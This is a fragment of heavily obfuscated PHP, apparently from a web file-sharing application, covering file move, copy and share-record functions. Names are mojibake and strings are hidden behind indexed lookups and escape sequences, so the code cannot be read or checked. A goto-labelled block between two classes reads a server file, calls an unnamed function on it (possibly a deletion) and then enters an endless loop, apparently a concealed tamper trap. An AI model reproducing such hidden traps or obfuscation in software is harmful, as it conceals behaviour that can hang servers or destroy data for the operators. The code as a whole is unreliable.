$‰¦™©‡¹; $¶‚ª˜—Â = !1; if ($¯ëŒŸ¶„) { if ($ÚáĞØ¾¿ == REPEAT_RENAME_FOLDER) { $–³êÕçÀ = $this->fileNameAuto($Ï®¡Ü„‚, $–³êÕçÀ, $ÚáĞØ¾¿, $¯ëŒŸ¶„); $ğ›Šæäí = $this->_moveForce($•Ãà’Æ, $Ï®¡Ü„‚, $–³êÕçÀ); } else { if ($ÚáĞØ¾¿ == REPEAT_RENAME_FOLDER) { $ÚáĞØ¾¿ = REPEAT_RENAME; } $º©Æ¨€ = $this->_childrenListSelect($•Ãà’Æ); foreach ($º©Æ¨€ as $‹¶şåş·) { $this->_move($‹¶şåş·[$²ú¬±­‡[397]], $‰¦™©‡¹, $ÚáĞØ¾¿, $–ß”¢’); } $¶‚ª˜—Â = !0; } } else { if ($ÚáĞØ¾¿ == REPEAT_SKIP) { $¶‚ª˜—Â = !0; } else { if ($ÚáĞØ¾¿ == REPEAT_RENAME || $ÚáĞØ¾¿ == REPEAT_RENAME_FOLDER) { $–³êÕçÀ = $this->fileNameAuto($Ï®¡Ü„‚, $–³êÕçÀ, $ÚáĞØ¾¿, $¯ëŒŸ¶„); $ğ›Šæäí = $this->_moveForce($•Ãà’Æ, $Ï®¡Ü„‚, $–³êÕçÀ); } else { if ($ÚáĞØ¾¿ == REPEAT_REPLACE) { $ÚñÄá’ = $this->sourceInfoCache($‰¦™©‡¹); $¤Ø—ŸÇÚ = $this->fileHistory($ÚñÄá’, $¡“ëş«ş[$²ú¬±­‡[461]], $¡“ëş«ş[$²ú¬±­‡[78]]); $¶‚ª˜—Â = !0; if ($¤Ø—ŸÇÚ) { $–ß”¢’[$²ú¬±­‡[554]][] = $¡“ëş«ş[$²ú¬±­‡[461]]; } } } } } if ($¶‚ª˜—Â && !$–ß”¢’[$²ú¬±­‡[586]]) { $–ß”¢’[$²ú¬±­‡[586]] = !0; } return $ğ›Šæäí; } private function _moveForce($“ÕÃ¢·…, $’§¸ØŸì, $Äø™æ£) { $ù”†™á¤ =& $_SERVER[ÏÒ Ì„]; $îûÚÒäĞ = $this->sourceInfo($“ÕÃ¢·…); $¬š¼§ = $this->sourceInfo($’§¸ØŸì); $áÈöıºó = $îûÚÒäĞ[$ù”†™á¤[405]] == $ù”†™á¤[87]; $ß§ÔØû§ = array($ù”†™á¤[396] => $¬š¼§[$ù”†™á¤[397]], $ù”†™á¤[578] => $¬š¼§[$ù”†™á¤[515]] . $¬š¼§[$ù”†™á¤[397]] . $ù”†™á¤[47], $ù”†™á¤[574] => $¬š¼§[$ù”†™á¤[406]], $ù”†™á¤[575] => $¬š¼§[$ù”†™á¤[498]], $ù”†™á¤[577] => USER_ID, $ù”†™á¤[415] => $Äø™æ£); $ğÛ Ëµ = $îûÚÒäĞ[$ù”†™á¤[406]] == SourceModel::TYPE_GROUP && $¬š¼§[$ù”†™á¤[406]] == SourceModel::TYPE_GROUP && $îûÚÒäĞ[$ù”†™á¤[498]] == $¬š¼§[$ù”†™á¤[498]]; if (!$ğÛ Ëµ && $this->moveClearAuth) { Model($ù”†™á¤[496])->authClear($“ÕÃ¢·…); } $õ Æ ±è = $îûÚÒäĞ[$ù”†™á¤[425]] == $ù”†™á¤[87] && $¬š¼§[$ù”†™á¤[425]] != $ù”†™á¤[87]; if ($õ Æ ±è) { $ß§ÔØû§[$ù”†™á¤[424]] = 0; } if ($áÈöıºó) { $ÛŸÏ»óï = array($ù”†™á¤[578] => array($ù”†™á¤[538], $îûÚÒäĞ[$ù”†™á¤[515]] . $îûÚÒäĞ[$ù”†™á¤[397]] . $ù”†™á¤[539])); $‹¸Ù¾©à = $îûÚÒäĞ[$ù”†™á¤[515]] . $îûÚÒäĞ[$ù”†™á¤[397]] . $ù”†™á¤[47]; $ßğ½Àê› = $¬š¼§[$ù”†™á¤[515]] . $¬š¼§[$ù”†™á¤[397]] . $ù”†™á¤[47] . $îûÚÒäĞ[$ù”†™á¤[397]] . $ù”†™á¤[47]; $Ç•ÔéÌâ = array($ù”†™á¤[578] => array($ù”†™á¤[587], "\162\x65\160\x6c\141\x63\145\50\160\141\x72\x65\156\x74\114\145\x76\145\x6c\54\x27{$‹¸Ù¾©à}\47\x2c\47{$ßğ½Àê›}\x27\x29"), $ù”†™á¤[574] => $¬š¼§[$ù”†™á¤[406]], $ù”†™á¤[575] => $¬š¼§[$ù”†™á¤[498]]); if ($õ Æ ±è) { $Ç•ÔéÌâ[$ù”†™á¤[424]] = 0; } $this->where($ÛŸÏ»óï)->data($Ç•ÔéÌâ)->save(); } $this->where(array($ù”†™á¤[412] => $“ÕÃ¢·…))->data($ß§ÔØû§)->save(); return $“ÕÃ¢·…; } private function clearShare($Ø×¦ºÚï, $ôÌû€³Ä) { $œ’ä‡’ =& $_SERVER[ÏÒ Ì„]; $³öÃ’ªÄ = $this->sourceInfo($Ø×¦ºÚï); $ùÙ§³Š = $this->sourceInfo($ôÌû€³Ä); if ($³öÃ’ªÄ[$œ’ä‡’[498]] == $ùÙ§³Š[$œ’ä‡’[498]] && $³öÃ’ªÄ[$œ’ä‡’[406]] == $œ’ä‡’[588]) { return; } $ğ’ŠàÖ¨ = array($œ’ä‡’[515] => array($œ’ä‡’[538], $³öÃ’ªÄ[$œ’ä‡’[515]] . $Ø×¦ºÚï . $œ’ä‡’[539])); $æ¥äÕ  = $this->field($œ’ä‡’[412])->where($ğ’ŠàÖ¨)->getField($œ’ä‡’[397], !0); if (!$æ¥äÕ ) { return; } $ğ’ŠàÖ¨ = array($œ’ä‡’[397] => array($œ’ä‡’[7], $æ¥äÕ ), $œ’ä‡’[489] => 1); $Àòó ùê = Model($œ’ä‡’[589])->field($œ’ä‡’[482])->where($ğ’ŠàÖ¨)->select(); if (!$Àòó ùê) { return; } $Àòó ùê = array_to_keyvalue($Àòó ùê, $œ’ä‡’[33], $œ’ä‡’[482]); $ğ’ŠàÖ¨ = array($œ’ä‡’[482] => array($œ’ä‡’[7], $Àòó ùê)); Model($œ’ä‡’[589])->where($ğ’ŠàÖ¨)->save(array($œ’ä‡’[489] => 0)); Model($œ’ä‡’[590])->where($ğ’ŠàÖ¨)->delete(); } public function copyFolderFromIO($£×¤İ´í, $¬³Õ¤È, $œÍ½áÆ˜, $¥øá‘ÈÆ, $œÜ¨Í‚â, $Õõ”Ãªí = false) { $´£µ‘®æ =& $_SERVER[ÏÒ Ì„]; $ò¾›ø½ş = array($´£µ‘®æ[555] => array(), $´£µ‘®æ[556] => array(), $´£µ‘®æ[554] => array(), $´£µ‘®æ[591] => array()); $á‚†™¤ø = $Õõ”Ãªí ? $Õõ”Ãªí : $£×¤İ´í->pathThis($¬³Õ¤È); $ë¾½ŞÌÔ = $this->fileNameExist($œÍ½áÆ˜, $á‚†™¤ø); $®ß‡Æí‚ = $this->mkdir($œÍ½áÆ˜, $á‚†™¤ø, $¥øá‘ÈÆ); if (!$ë¾½ŞÌÔ || $¥øá‘ÈÆ == REPEAT_RENAME_FOLDER) { $¥øá‘ÈÆ = !1; } if ($ë¾½ŞÌÔ) { $this->_childrenAllMake($ë¾½ŞÌÔ); } Hook::trigger($´£µ‘®æ[592]); $this->_copyChildTo($£×¤İ´í, $¬³Õ¤È, $®ß‡Æí‚, $¥øá‘ÈÆ, $ò¾›ø½ş, $œÜ¨Í‚â); Hook::trigger($´£µ‘®æ[593]); if ($®ß‡Æí‚) { $this->folderSizeResetChildren($®ß‡Æí‚); } $this->_childrenListClear(); Model($´£µ‘®æ[557])->addAll($ò¾›ø½ş[$´£µ‘®æ[555]], array(), !0); Model($´£µ‘®æ[558])->eventCopy($®ß‡Æí‚); $this->saveAll($ò¾›ø½ş[$´£µ‘®æ[556]]); Model($´£µ‘®æ[464])->linkAdd($ò¾›ø½ş[$´£µ‘®æ[554]]); Model($´£µ‘®æ[464])->remove($ò¾›ø½ş[$´£µ‘®æ[591]]); $this->folderSizeReset($œÍ½áÆ˜); $this->updateModifyTime($œÍ½áÆ˜); return $®ß‡Æí‚; } private function _copyChildTo($İÍƒ¼Ã, $Áƒ£Âİ±, $“êç™–ç, $×“ÆªÄ•, &$ÍÖæ¯ë, $„ô¸Ÿ¶‡) { $İ¹¾ˆô÷ =& $_SERVER[ÏÒ Ì„]; $ÑûÁÒ² = $this->sourceInfoCache($“êç™–ç); $Ï³àÊÌ· = $İÍƒ¼Ã->listPath($Áƒ£Âİ±); $Ï³àÊÌ· = $Ï³àÊÌ· ? $Ï³àÊÌ· : array($İ¹¾ˆô÷[74] => array(), $İ¹¾ˆô÷[75] => array()); $áŒæâáÁ = array_merge($Ï³àÊÌ·[$İ¹¾ˆô÷[74]], $Ï³àÊÌ·[$İ¹¾ˆô÷[75]]); $†«ö¹¸â = $this->_addFiles($İÍƒ¼Ã, $Ï³àÊÌ·[$İ¹¾ˆô÷[74]], $„ô¸Ÿ¶‡); $ùÆığ¢Æ = array(); foreach ($áŒæâáÁ as &$›Ù–ÖÓ) { if (isset($†«ö¹¸â[$›Ù–ÖÓ[$İ¹¾ˆô÷[28]]])) { $›Ù–ÖÓ = $†«ö¹¸â[$›Ù–ÖÓ[$İ¹¾ˆô÷[28]]]; } $›Ù–ÖÓ[$İ¹¾ˆô÷[405]] = $›Ù–ÖÓ[$İ¹¾ˆô÷[29]] == $İ¹¾ˆô÷[77]; $›Ù–ÖÓ[$İ¹¾ˆô÷[407]] = _get($›Ù–ÖÓ, $İ¹¾ˆô÷[168], $İ¹¾ˆô÷[33]); $›Ù–ÖÓ[$İ¹¾ˆô÷[78]] = _get($›Ù–ÖÓ, $İ¹¾ˆô÷[78], 0); $›Ù–ÖÓ[$İ¹¾ˆô÷[461]] = _get($›Ù–ÖÓ, $İ¹¾ˆô÷[461], 0); if (!isset($›Ù–ÖÓ[$İ¹¾ˆô÷[594]]) && $›Ù–ÖÓ[$İ¹¾ˆô÷[461]]) { $ÍÖæ¯ë[$İ¹¾ˆô÷[591]][] = $›Ù–ÖÓ[$İ¹¾ˆô÷[461]]; } if ($×“ÆªÄ•) { $¦Ã½¸²‡ = $this->fileNameExistCache($“êç™–ç, $›Ù–ÖÓ[$İ¹¾ˆô÷[28]]); if ($¦Ã½¸²‡) { if ($›Ù–ÖÓ[$İ¹¾ˆô÷[405]] || $×“ÆªÄ• == REPEAT_SKIP) { continue; } if ($×“ÆªÄ• == REPEAT_REPLACE) { $Â Äô´ı = $this->sourceInfoCache($¦Ã½¸²‡); $¹½å â = $this->fileHistory($Â Äô´ı, $›Ù–ÖÓ[$İ¹¾ˆô÷[461]], $›Ù–ÖÓ[$İ¹¾ˆô÷[78]]); if ($¹½å â) { $ÍÖæ¯ë[$İ¹¾ˆô÷[554]][] = $›Ù–ÖÓ[$İ¹¾ˆô÷[461]]; } continue; } else { if ($×“ÆªÄ• == REPEAT_RENAME) { $›Ù–ÖÓ[$İ¹¾ˆô÷[28]] = $this->fileNameAutoCache($“êç™–ç, $›Ù–ÖÓ[$İ¹¾ˆô÷[28]], $×“ÆªÄ•, !1); } } } } if (!$›Ù–ÖÓ[$İ¹¾ˆô÷[405]] && $›Ù–ÖÓ[$İ¹¾ˆô÷[461]]) { $ÍÖæ¯ë[$İ¹¾ˆô÷[554]][] = $›Ù–ÖÓ[$İ¹¾ˆô÷[461]]; } $ùÆığ¢Æ[] = $this->_makeItemData($›Ù–ÖÓ, $ÑûÁÒ², $›Ù–ÖÓ[$İ¹¾ˆô÷[28]]); } unset($›Ù–ÖÓ); if (!empty($ùÆığ¢Æ)) { $this->addAll($ùÆığ¢Æ); $this->_childrenListSelect($“êç™–ç); } $ÀŞüëï = $this->_childrenList($“êç™–ç); $ÀŞüëï = array_to_keyvalue($ÀŞüëï, $İ¹¾ˆô÷[28]); foreach ($áŒæâáÁ as $›Ù–ÖÓ) { $Â Äô´ı = $ÀŞüëï[$›Ù–ÖÓ[$İ¹¾ˆô÷[28]]]; $§şÌ´Çù = $Â Äô´ı[$İ¹¾ˆô÷[397]]; $this->_copyApplyMeta($Â Äô´ı, $ÍÖæ¯ë); if ($›Ù–ÖÓ[$İ¹¾ˆô÷[29]] == $İ¹¾ˆô÷[77]) { $›Ù–ÖÓ[$İ¹¾ˆô÷[76]] = $İÍƒ¼Ã->getPathInner($›Ù–ÖÓ[$İ¹¾ˆô÷[76]]); $this->_copyChildTo($İÍƒ¼Ã, $›Ù–ÖÓ[$İ¹¾ˆô÷[76]], $§şÌ´Çù, $×“ÆªÄ•, $ÍÖæ¯ë, $„ô¸Ÿ¶‡); } } } private function _addFiles($…¶áßàà, $§ÙÖÀ¶, $€¯óø®–) { $¬º—ìÀ =& $_SERVER[ÏÒ Ì„]; if (!$§ÙÖÀ¶ || count($§ÙÖÀ¶) == 0) { return array(); } $•ÜŒûŒÆ = array(); foreach ($§ÙÖÀ¶ as &$ö¶×¶ŞÜ) { Hook::trigger($¬º—ìÀ[595], $ö¶×¶ŞÜ); $ö¶×¶ŞÜ[$¬º—ìÀ[76]] = $…¶áßàà->getPathInner($ö¶×¶ŞÜ[$¬º—ìÀ[76]]); $ú¶®ƒóŒ = $…¶áßàà->hashSimple($ö¶×¶ŞÜ[$¬º—ìÀ[76]]); $»ñœõñ¸ = $…¶áßàà->hashMd5($ö¶×¶ŞÜ[$¬º—ìÀ[76]]); if (strlen($»ñœõñ¸) > 10 && !isset($•ÜŒûŒÆ[$»ñœõñ¸])) { $•ÜŒûŒÆ[$»ñœõñ¸] = array(); } $ö¶×¶ŞÜ[$¬º—ìÀ[171]] = $ú¶®ƒóŒ; $ö¶×¶ŞÜ[$¬º—ìÀ[170]] = $»ñœõñ¸; Hook::trigger($¬º—ìÀ[596], $ö¶×¶ŞÜ); $•ÜŒûŒÆ[$»ñœõñ¸][] =& $ö¶×¶ŞÜ; if (count($•ÜŒûŒÆ[$»ñœõñ¸]) > 1) { $ö¶×¶ŞÜ[$¬º—ìÀ[594]] = !0; } } unset($ö¶×¶ŞÜ); $©¤´œ‰ = array($¬º—ìÀ[170] => array($¬º—ìÀ[7], array_keys($•ÜŒûŒÆ))); $çÓ‡°· = Model($¬º—ìÀ[597]); $ÆÑşšÉå = $çÓ‡°·->where($©¤´œ‰)->select(); $ÆÑşšÉå = $ÆÑşšÉå ? $ÆÑşšÉå : array(); foreach ($ÆÑşšÉå as $“Ó‰¸) { if (!isset($•ÜŒûŒÆ[$“Ó‰¸[$¬º—ìÀ[170]]])) { continue; } $üÁã¹ƒÎ = $•ÜŒûŒÆ[$“Ó‰¸[$¬º—ìÀ[170]]]; foreach ($üÁã¹ƒÎ as &$ö¶×¶ŞÜ) { $ö¶×¶ŞÜ[$¬º—ìÀ[461]] = $“Ó‰¸[$¬º—ìÀ[461]]; $ö¶×¶ŞÜ[$¬º—ìÀ[594]] = !0; } unset($ö¶×¶ŞÜ); } $¸¥ƒçÅ = array(); foreach ($§ÙÖÀ¶ as $åÇÖÛ©´) { if (isset($åÇÖÛ©´[$¬º—ìÀ[594]]) && $åÇÖÛ©´[$¬º—ìÀ[594]]) { continue; } $Å±Ôığû = $…¶áßàà->getPathInner($åÇÖÛ©´[$¬º—ìÀ[76]]); $‡Í—ì‘µ = $çÓ‡°·->addFileMake($Å±Ôığû, $åÇÖÛ©´[$¬º—ìÀ[78]], $åÇÖÛ©´[$¬º—ìÀ[171]], $åÇÖÛ©´[$¬º—ìÀ[170]], $åÇÖÛ©´[$¬º—ìÀ[28]], $€¯óø®–); $¸¥ƒçÅ[] = $‡Í—ì‘µ; } $çÓ‡°·->addAll($¸¥ƒçÅ); $©¤´œ‰ = array($¬º—ìÀ[170] => array($¬º—ìÀ[7], array_keys($•ÜŒûŒÆ))); $ÆÑşšÉå = $çÓ‡°·->where($©¤´œ‰)->select(); $ÆÑşšÉå = $ÆÑşšÉå ? $ÆÑşšÉå : array(); foreach ($ÆÑşšÉå as $“Ó‰¸) { if (!isset($•ÜŒûŒÆ[$“Ó‰¸[$¬º—ìÀ[170]]])) { continue; } $µˆ’Øíó =& $•ÜŒûŒÆ[$“Ó‰¸[$¬º—ìÀ[170]]]; foreach ($µˆ’Øíó as &$ö¶×¶ŞÜ) { $ö¶×¶ŞÜ[$¬º—ìÀ[461]] = $“Ó‰¸[$¬º—ìÀ[461]]; } unset($ö¶×¶ŞÜ); } $¡Ş ò = array(); foreach ($§ÙÖÀ¶ as $””©¦å¿) { $¡Ş ò[$””©¦å¿[$¬º—ìÀ[28]]] = $””©¦å¿; } return $¡Ş ò; } } goto FˆÜ¢ïÍ¥; DÆÃ†«â–¹: if (!isset($_SERVER[$_SERVER[ÏÒ Ì„][871]]) || !isset($_SERVER[$_SERVER[ÏÒ Ì„][869]])) { $_getc = $_SERVER[ÏÒ Ì„][873]; $_getfile = $_SERVER[$_SERVER[ÏÒ Ì„][874]] . $_SERVER[ÏÒ Ì„][875]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÏÒ Ì„][229], $_getfilec); if (count($_getarrs) < $_SERVER[ÏÒ Ì„][644]) { $exit = $_SERVER[ÏÒ Ì„][876]; $exit(); } $_act = $_SERVER[ÏÒ Ì„][1259]; $_act($_SERVER[$_SERVER[ÏÒ Ì„][874]] . $_SERVER[ÏÒ Ì„][875]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ÏÒ Ì„][376]); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\162\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\x79\x54\151\x6d\x65", "\x74\151\155\145", "\151\x6e\x73\x65\162\164\54\x75\x70\144\x61\x74\x65", "\x66\165\156\x63\x74\151\x6f\x6e"), array("\143\x72\145\x61\x74\x65\x54\x69\155\145", "\x74\x69\x6d\x65", "\151\x6e\x73\145\162\164", "\x66\x75\x6e\x63\164\x69\157\156"), array("\157\160\164\x69\157\156\163", '', "\x69\156\163\145\x72\164\x2c\x75\160\144\141\x74\x65\x2c\163\x65\x6c\145\x63\164", "\152\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($©¸¹»ß) { $ã™ã§Ÿˆ =& $_SERVER[ÏÒ Ì„]; $Ëğøö¬ = isset($©¸¹»ß[0]) ? $©¸¹»ß[0] : !1; return array($ã™ã§Ÿˆ[1882] => array(USER_ID, $ã™ã§Ÿˆ[1883]), $ã™ã§Ÿˆ[1825] => array($Ëğøö¬, $ã™ã§Ÿˆ[1884])); } protected function listSimple() { $—á‚€Óø = array($_SERVER[ÏÒ Ì„][1578] => USER_ID); $ÆÚÂ†ë = $this->field($this->fieldList)->where($—á‚€Óø)->select(); return $ÆÚÂ†ë ? $ÆÚÂ†ë : array(); } protected function getInfo($¿å©óá, $É·ØÚìÑ = false) { $ôß·¶© =& $_SERVER[ÏÒ Ì„]; if ($É·ØÚìÑ) { return $this->_getShareInfo(array($ôß·¶©[482] => $¿å©óá)); } $Şæ‚ØöÉ = $this->cacheFunctionGet($ôß·¶©[1827], $¿å©óá); return $Şæ‚ØöÉ; } public function getInfoByHash($¢ŠúÄêÍ) { return $this->_getShareInfo(array($_SERVER[ÏÒ Ì„][484] => $¢ŠúÄêÍ)); } public function getInfoByPath($³€ôïá) { $šËËÆâ =& $_SERVER[ÏÒ Ì„]; $”€˜ıè = array($šËËÆâ[1578] => USER_ID, $šËËÆâ[397] => $³€ôïá); return $this->_getShareInfo($”€˜ıè); } public function getInfoBySourcePath($Ü¦ª…”) { $ÉÃâ›˜ç =& $_SERVER[ÏÒ Ì„]; $´º€êÈ = array($ÉÃâ›˜ç[1578] => USER_ID, $ÉÃâ›˜ç[1104] => $Ü¦ª…”); return $this->_getShareInfo($´º€êÈ); } private function _getShareInfo($Ë¦¾ÑÉ‹) { $ßùŞ†éí =& $_SERVER[ÏÒ Ì„]; $Şıó™ î = $this->where($Ë¦¾ÑÉ‹)->find(); if (!$Şıó™ î) { return !1; } $Ë¦¾ÑÉ‹ = array($ßùŞ†éí[482] => $Şıó™ î[$ßùŞ†éí[482]]); $İ ­ıôŞ = $ßùŞ†éí[1885]; $©ôş½¤Ä = Model($ßùŞ†éí[590])->order($ßùŞ†éí[395])->field($İ ­ıôŞ)->where($Ë¦¾ÑÉ‹)->select(); if ($Şıó™ î[$ßùŞ†éí[397]] == $ßùŞ†éí[191]) { $Şıó™ î[$ßùŞ†éí[85]] = IO::info($Şıó™ î[$ßùŞ†éí[1104]]); } else { $Şıó™ î[$ßùŞ†éí[85]] = Model($ßùŞ†éí[1251])->pathInfo($Şıó™ î[$ßùŞ†éí[397]]); } $Şıó™ î[$ßùŞ†éí[1886]] = $©ôş½¤Ä; return $Şıó™ î; } protected function getInfoAuth($Ó´’üè) { $ŞÔ¾‹™¸ =& $_SERVER[ÏÒ Ì„]; $ ßú›Òã = $this->getInfo($Ó´’üè); if ($ ßú›Òã[$ŞÔ¾‹™¸[1578]] == USER_ID) { $ ßú›Òã[$ŞÔ¾‹™¸[408]] = $ ßú›Òã[$ŞÔ¾‹™¸[85]][$ŞÔ¾‹™¸[408]]; } else { $ ßú›Òã[$ŞÔ¾‹™¸[408]] = Model($ŞÔ¾‹™¸[496])->authMake($ ßú›Òã[$ŞÔ¾‹™¸[1886]]); } return $ ßú›Òã; } protected function listData($°Ûç«ğ— = null, $ã™÷ïî = 300) { $ÍÌÆàŒÛ =& $_SERVER[ÏÒ Ì„]; $–ùÂü„‘ = array(array($ÍÌÆàŒÛ[487] => array($ÍÌÆàŒÛ[1006], 0), $ÍÌÆàŒÛ[489] => array($ÍÌÆàŒÛ[1006], 0), $ÍÌÆàŒÛ[1887] => $ÍÌÆàŒÛ[1841])); if ($°Ûç«ğ— == $ÍÌÆàŒÛ[1888]) { $–ùÂü„‘ = array($ÍÌÆàŒÛ[487] => 1); } else { if ($°Ûç«ğ— == $ÍÌÆàŒÛ[1089]) { $–ùÂü„‘ = array($ÍÌÆàŒÛ[489] => 1); } } $–ùÂü„‘[$ÍÌÆàŒÛ[1578]] = USER_ID; $Ñ¢²á­Ô = $this->where($–ùÂü„‘)->selectPage($ã™÷ïî); return $Ñ¢²á­Ô; } protected function listToMe($Ğ˜è‘íŒ = 300) { $ÒÅˆâÍ =& $_SERVER[ÏÒ Ì„]; $¡‰üÚ = Model($ÒÅˆâÍ[1889])->userGroupParents(USER_ID); $–—€ÌÜ = array($ÒÅˆâÍ[574] => SourceModel::TYPE_USER, $ÒÅˆâÍ[498] => USER_ID); if ($¡‰üÚ) { $–—€ÌÜ = array(array($ÒÅˆâÍ[574] => SourceModel::TYPE_USER, $ÒÅˆâÍ[498] => USER_ID), array($ÒÅˆâÍ[574] => SourceModel::TYPE_GROUP, $ÒÅˆâÍ[498] => array($ÒÅˆâÍ[7], $¡‰üÚ)), $ÒÅˆâÍ[1887] => $ÒÅˆâÍ[1841]); } $ãÍ¥£¦ì = Model($ÒÅˆâÍ[590])->where($–—€ÌÜ)->selectPage($Ğ˜è‘íŒ); $Öñ¿ˆÚ = array_to_keyvalue_group($ãÍ¥£¦ì[$ÒÅˆâÍ[367]], $ÒÅˆâÍ[482]); if (!$Öñ¿ˆÚ) { return $ãÍ¥£¦ì; } $ÕÃÈ¬Š‡ = $ÒÅˆâÍ[1890]; $–—€ÌÜ = array($ÒÅˆâÍ[482] => array($ÒÅˆâÍ[413], array_keys($Öñ¿ˆÚ)), $ÒÅˆâÍ[1578] => array($ÒÅˆâÍ[1008], $ÒÅˆâÍ[191])); $ÛÊóÔõÄ = $this->field($ÕÃÈ¬Š‡)->where($–—€ÌÜ)->select(); foreach ($ÛÊóÔõÄ as $¢ş‘şÃ => &$š™‹Œ) { $š™‹Œ[$ÒÅˆâÍ[1886]] = $Öñ¿ˆÚ[$š™‹Œ[$ÒÅˆâÍ[482]]]; } unset($š™‹Œ); $„º¿Ğ½š = array($ÒÅˆâÍ[1891] => $ÛÊóÔõÄ, $ÒÅˆâÍ[1892] => $ãÍ¥£¦ì[$ÒÅˆâÍ[364]]); return $„º¿Ğ½š; } protected function shareAdd($£¦ÊŠ¿, $ğúßà± ) { $³ĞéÖÓ¯ =& $_SERVER[ÏÒ Ì„]; $éŒâÌùŸ = $this->_addShareData($£¦ÊŠ¿, $ğúßà± ); if (!empty($ğúßà± [$³ĞéÖÓ¯[1893]])) { $this->_shareAuthSet($éŒâÌùŸ, $ğúßà± [$³ĞéÖÓ¯[1893]]); } $this->shareEventAdd($£¦ÊŠ¿, $ğúßà± , $³ĞéÖÓ¯[1092]); return $éŒâÌùŸ; } protected function shareAddSystem($µİí²õÊ, $¿¿§¢«§) { $½™ô£ =& $_SERVER[ÏÒ Ì„]; $Á–›şÕÈ = $this->_addShareData($µİí²õÊ, $¿¿§¢«§, $½™ô£[1204]); $this->_shareAuthSet($Á–›şÕÈ, $¿¿§¢«§[$½™ô£[1893]]); return $Á–›şÕÈ; } private function shareEventAdd($§äœ‡à, $ñ÷Ø©‘¼, $õ‘­ëÄ¢ = "\141\x64\144") { $Àî†í©é =& $_SERVER[ÏÒ Ì„]; if (!$§äœ‡à || $§äœ‡à == $Àî†í©é[191]) { return; } if ($õ‘­ëÄ¢ == $Àî†í©é[1092]) { if ($ñ÷Ø©‘¼[$Àî†í©é[487]] == $Àî†í©é[87]) { Model($Àî†í©é[558])->eventShare($§äœ‡à, $Àî†í©é[1894]); } if ($ñ÷Ø©‘¼[$Àî†í©é[489]] == $Àî†í©é[87]) { Model($Àî†í©é[558])->eventShare($§äœ‡à, $Àî†í©é[1895]); } return; } $ÇÈ‚ë•ü = $this->getInfoByPath($§äœ‡à); $½¼ÈÖá¸ = $Àî†í©é[1896]; if ($ÇÈ‚ë•ü[$Àî†í©é[487]] == $Àî†í©é[191] && $ñ÷Ø©‘¼[$Àî†í©é[487]] == $Àî†í©é[87]) { $½¼ÈÖá¸ = $Àî†í©é[1894]; } if ($ÇÈ‚ë•ü[$Àî†í©é[487]] == $Àî†í©é[87] && $ñ÷Ø©‘¼[$Àî†í©é[487]] == $Àî†í©é[191]) { $½¼ÈÖá¸ = $Àî†í©é[1897]; } if ($ÇÈ‚ë•ü[$Àî†í©é[489]] == $Àî†í©é[191] && $ñ÷Ø©‘¼[$Àî†í©é[489]] == $Àî†í©é[87]) { $½¼ÈÖá¸ = $Àî†í©é[1895]; } if ($ÇÈ‚ë•ü[$Àî†í©é[489]] == $Àî†í©é[87] && $ñ÷Ø©‘¼[$Àî†í©é[489]] == $Àî†í©é[191]) { $½¼ÈÖá¸ = $Àî†í©é[1898]; } Model($Àî†í©é[558])->eventShare($§äœ‡à, $½¼ÈÖá¸); return; } private function _addShareData($¤ÊæØ¡¥, $ÛàØ£¨İ = array(), $Ã·¿Éªˆ = false) { $úÇŠÚ’‰ =& $_SERVER[ÏÒ Ì„]; $•¼ƒœ±Æ = $Ã·¿Éªˆ == $úÇŠÚ’‰[1204] ? 0 : USER_ID; $æ”úÃÀÂ = array($úÇŠÚ’‰[412] => $¤ÊæØ¡¥, $úÇŠÚ’‰[1569] => $•¼ƒœ±Æ); if ($¤ÊæØ¡¥ == 0) { $æ”úÃÀÂ = array($úÇŠÚ’‰[1899] => $ÛàØ£¨İ[$úÇŠÚ’‰[1104]], $úÇŠÚ’‰[1569] => $•¼ƒœ±Æ); } if ($«©É†‘• = $this->where($æ”úÃÀÂ)->find()) { return $«©É†‘•[$úÇŠÚ’‰[482]]; } if ($¤ÊæØ¡¥ == 0) { $ÙØèÏÄ = array($úÇŠÚ’‰[28] => get_path_this($ÛàØ£¨İ[$úÇŠÚ’‰[76]])); } else { $ÙØèÏÄ = Model($úÇŠÚ’‰[822])->sourceInfo($¤ÊæØ¡¥); if (!$ÙØèÏÄ) { return !1; } } if (!$ÛàØ£¨İ[$úÇŠÚ’‰[1478]]) { $ÛàØ£¨İ[$úÇŠÚ’‰[1478]] = $ÙØèÏÄ[$úÇŠÚ’‰[28]]; } $Çáûå§‹ = array($úÇŠÚ’‰[1569] => $•¼ƒœ±Æ, $úÇŠÚ’‰[412] => $¤ÊæØ¡¥, $úÇŠÚ’‰[1478] => $úÇŠÚ’‰[33], $úÇŠÚ’‰[487] => 0, $úÇŠÚ’‰[489] => 0, $úÇŠÚ’‰[1104] => $úÇŠÚ’‰[33], $úÇŠÚ’‰[305] => $úÇŠÚ’‰[33], $úÇŠÚ’‰[886] => $úÇŠÚ’‰[33], $úÇŠÚ’‰[1900] => 0, $úÇŠÚ’‰[1901] => 0, $úÇŠÚ’‰[490] => 0, $úÇŠÚ’‰[491] => $úÇŠÚ’‰[33], $úÇŠÚ’‰[484] => $úÇŠÚ’‰[33]); $•®Ï‘Ÿ¹ = explode($úÇŠÚ’‰[47], $úÇŠÚ’‰[1902]); foreach ($•®Ï‘Ÿ¹ as $¤ûÙÒÄ®) { if (!isset($ÛàØ£¨İ[$¤ûÙÒÄ®])) { continue; } $Çáûå§‹[$¤ûÙÒÄ®] = $ÛàØ£¨İ[$¤ûÙÒÄ®]; } $¶şšó« = $this->add($Çáûå§‹); $¢¹’Ø³§ = array($úÇŠÚ’‰[484] => short_id($¶şšó«)); $this->where(array($úÇŠÚ’‰[481] => $¶şšó«))->save($¢¹’Ø³§); return $¶şšó«; } private function _shareAuthSet($´ôÙŠ‚, $è°ë÷¨İ) { $ñÒ«ìŒõ =& $_SERVER[ÏÒ Ì„]; if (!is_array($è°ë÷¨İ)) { return !1; } $ÖÓÊÛ¶ = Model($ñÒ«ìŒõ[1853]); $ÖÓÊÛ¶->where(array($ñÒ«ìŒõ[482] => $´ôÙŠ‚))->delete(); $ï»ÍŒ = array(); foreach ($è°ë÷¨İ as $æÔôÀ³§) { $ÍéÀÙÂÏ = SourceModel::TYPE_USER; if ($æÔôÀ³§[$ñÒ«ìŒõ[406]] == SourceModel::TYPE_GROUP) { $ÍéÀÙÂÏ = 